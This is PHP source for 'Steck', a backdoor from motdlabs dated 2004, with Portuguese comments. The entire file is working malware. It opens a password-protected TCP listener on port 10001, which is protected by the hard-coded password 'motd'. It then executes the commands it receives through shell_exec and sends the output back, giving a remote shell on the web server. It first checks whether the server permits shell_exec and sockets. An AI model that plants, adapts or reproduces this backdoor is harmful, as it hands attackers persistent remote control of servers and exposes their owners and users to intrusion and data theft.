<?php
/*  ____________________________________________________________________
   | Steck - Backdoor em php                                            |
   | Copyright (C) 2004 tDs - tds@motdlabs.org   motdlabs.org           |
   |....................................................................|
   | vars_ini = stc                                                     |
   | func_ini = STC                                                     |
   |....................................................................|
   | Este programa � software livre; voc� pode redistribu�-lo e/ou      |
   | modific�-lo sob os termos da Licen�a P�blica Geral GNU, conforme   |
   | publicada pela Free Software Foundation; tanto a vers�o 2 da       |
   | Licen�a como (a seu crit�rio) qualquer vers�o mais nova.           |
   +====================================================================+
*/
define ('_STECK_ADD_', $_SERVER['SERVER_ADDR']);
define ('_STECK_PORTA_', '10001');
define ('_STECK_DEBUG_', 1);
define ('_STECK_SENHA_', 'motd');
?>
<?php
/***
 Funcao que ira criar a backdoor.
 Nao recebe nenhum parametro, mas precisa de 4 define(), antes de
 ser chamada. Verifique em INFO.TXT quais sao estes defines.
*/
function STC_bdoor ()
{
    define ('_STECK_MSG_SENHA_', 'Have you a password? '."\00");
    define ('_STECK_MSG_SHELL_', 'steck@motdlabs:');
    define ('_STECK_VERSION_', '0.3');
    define ('_STECK_SECURE_', false);
    
    /*** exibe o primeiro banner, solicitando a senha */
    function STC_banner ()
    {
       $stc_ban =    "\n\033[2J\033[0;0H".
                    str_repeat ("=", 21)."\n\r".
                    "|  Steck - by tDs\n\r".
                    "| MotdLabs.org 2004\n\r".
                    "| VERSION "._STECK_VERSION_."\n\r".
                    str_repeat ("=", 21)."\n\r".
                    _STECK_MSG_SENHA_;
        return ($stc_ban);
    }
    
    /*** socket_write modificado. codifica dados, se necessario */
    function STC_socket_write ($stc_fd, $stc_cont, $stc_len) {
        if (_STECK_SECURE_ == true) {
            $stc_cont = base64_encode ($stc_cont);
            $stc_send = socket_write ($stc_fd, $stc_cont, $stc_len);
            return ($stc_send);
        } else {
            $stc_send = socket_write ($stc_fd, $stc_cont, $stc_len);
            return ($stc_send);
        }
    }
    
    /*** fgets modificado. decodifica dados, se necessario */
    function STC_socket_read ($stc_fd, $stc_len, $stc_type) {
        if (_STECK_SECURE_ == true) {
            $stc_get = socket_read ($stc_fd, $stc_len, $stc_type);
            $stc_get = base64_decode ($stc_get);
            return ($stc_get);
        } else {
            $stc_get = socket_read ($stc_fd, $stc_len, $stc_type);
            return ($stc_get);
        }
    }

        
    /*** exibe a linha em que o erro ocorreu. */
    function STC_erro($stcl_inha)
    {
        echo 'erro em'.$stcl_inha;
    }
    
    /*** verifica os requisitos para execucao da backdoor */
    function STC_verperms()
    {
        if (get_cfg_var ('safe_mode')) {
            return ('SAFE MODE ATIVADO');
        }
        if (!function_exists ('shell_exec')) {
            return ('SHELL_EXEC DESATIVADO');
        }
        if (!function_exists ('socket_create')) {
            return ('SOCKETS DESATIVADOS');
        }
        return (0);
    }
    
    /*** 
     exibe uma linha com informacoes sobre o diretorio que se
     encontra, emulando uma shell
    */
    function STC_shellmsg()
    {
        $stc_msg  = _STECK_MSG_SHELL_;
        $stc_msg .= shell_exec ('pwd');
        $stc_msg  = str_replace ("\n", '', $stc_msg);
        $stc_msg  = str_replace ("\r", '', $stc_msg);
        $stc_msg .= '$'."\00";
        return ($stc_msg);
    }
    
    /*** apos conectado, exibe informacoes sobre a backdoor e o logo dela */
    function STC_info ()
    {
        $stc_v = _STECK_VERSION_;
        $stc_str = 
                    "\033[1m".
                    "     _.-''''-._ \n\r".
                    "   .'          '. \n\r".
                    "  /   \033[31mX      X   \033[0;1m\ \n\r".
                    " | __          __ | \n\r".
                    " |  \          /  | \n\r".
                    "  \  '.      .'\ /  \n\r".
                    "   '.  '----'\_/' \n\r".
                    "     '-.____.-' \033[0m\n\r".
                    "        STECK $stc_v - by tDs - \033[4;1;43m".
                    "MotdLabs.org\033[0m\n\r";
        
        $stc_info = 
                    "\n\033[2J\033[0;0H".
                    str_repeat ("'", 45)."\n\r".
                    $stc_str."\n\r".
                    'Para sair e finalizar, digite "T".'."\n\r".
                    'Para sair sem finalizar, digite "exit".'."\n\r".
                    'Para executar comandos, digite o comando.'."\n\r".
                    str_repeat ("'", 45)."\n\r";
        return ($stc_info);
    }
    
    if (_STECK_DEBUG_ == 1) {
        error_reporting (E_ALL ^ E_NOTICE);
    } else {
        error_reporting (0);
    }
    
    set_time_limit (0);
    ob_implicit_flush ();
    $stc_msgSenha = _STECK_MSG_SENHA_;
    $stc_flag     = 0;
    $stc_tries    = 0;
    
    if (($stc_sock = socket_create (AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {
        STCerro (__LINE__);
    }
    if (($stc_ret = socket_bind ($stc_sock, _STECK_ADD_, _STECK_PORTA_)) < 0) {
        STCerro (__LINE__);
    }
    if (($stc_ret = socket_listen ($stc_sock, 5)) < 0) {
        STCerro (__LINE__);
    }
    if ($stc_perms = STC_verperms ()) {
        $stc_msg = "Nao foi possivel criar backdoor: $stc_perms .";
        echo $stc_msg;
        return (0);
    }
    
    flush ();
    
    do {
        if (($stc_SockFD = socket_accept ($stc_sock)) < 0) {
            STC_erro (__LINE__);
            break;
        }
        
        /*** envia o banner ao usuario */
        $stc_msg = STC_banner();
        STC_socket_write ($stc_SockFD, $stc_msg, strlen ($stc_msg));
        
        do {
            if (false === ($stc_buf = STC_socket_read 
                          ($stc_SockFD, 8192,  PHP_NORMAL_READ))) {
                STC_erro (__LINE__);
                break 2;
            }
            
            /*** verificacao de senha */
            if (!@$stc_flag) {
                $stc_vSenha = trim ($stc_buf);
                if (!$stc_vSenha) {
                    continue;
                } else {
                    if ($stc_vSenha == _STECK_SENHA_) {
                        $stc_flag = 1;
                        $stc_inf  = STC_info ();
                        $stc_inf .= "\n\r".STC_shellmsg ();
                        STC_socket_write ($stc_SockFD, $stc_inf, strlen 
                                                                 ($stc_inf));
                        unset ($stc_tries);
                        continue;
                    } else {
                        $stc_tries++;
                        if ($stc_tries > 2) {
                            socket_close ($stc_SockFD);
                            unset ($stc_tries);
                            break;
                        }
                        $stc_msg = $stc_msgSenha;
                        STC_socket_write ($stc_SockFD, $stc_msg, strlen 
                                                                 ($stc_msg));
                        continue;
                    }
                }
            }
            /*** fim de verificacao de senha */
            
            if (!$stc_buf = trim ($stc_buf)) { continue; }
            
            /*** sair da backdoor*/
            if ($stc_buf == 'exit') { 
                unset ($stc_flag); 
                break; 
            } 
            /*** terminar backdoor */
            if ($stc_buf == 'T') {
                socket_close ($stc_SockFD);
                break 2;
            }
            
            /*** mudanca de diretorio e' tratada de forma diferente */
            if (substr_count ($stc_buf, "cd") && strpos ($stc_buf, " ") == 2) {
                $stc_exe = chdir (str_replace ("cd ", "", $stc_buf));
            } else {
                if (substr_count ($stc_buf, "ls") && 
                                 (( strpos ($stc_buf, " ") == 2) || 
                                    strlen ($stc_buf) == 2)) {
                    $stc_buf .= " -h --color=always";
                } 
                
                $stc_buf .= " 2>&1";
                $stc_exe  = shell_exec ($stc_buf);
                $stc_exe  = str_replace ("\n", "\n\r", $stc_exe);
                
                if (_STECK_DEBUG_ == 1) {
                    echo $stc_buf.'<br>'.nl2br ($stc_exe).'<pre><br><hr>';
                }
                
                STC_socket_write ($stc_SockFD, $stc_exe, strlen ($stc_exe));
            }
            
            $stc_msgRet = STC_shellmsg ();
            STC_socket_write ($stc_SockFD, $stc_msgRet, strlen ($stc_msgRet));
            
        } while (true);
        
        socket_close ($stc_SockFD);
    } while (true);
    
    socket_close ($stc_sock);
}
STC_bdoor ();
?>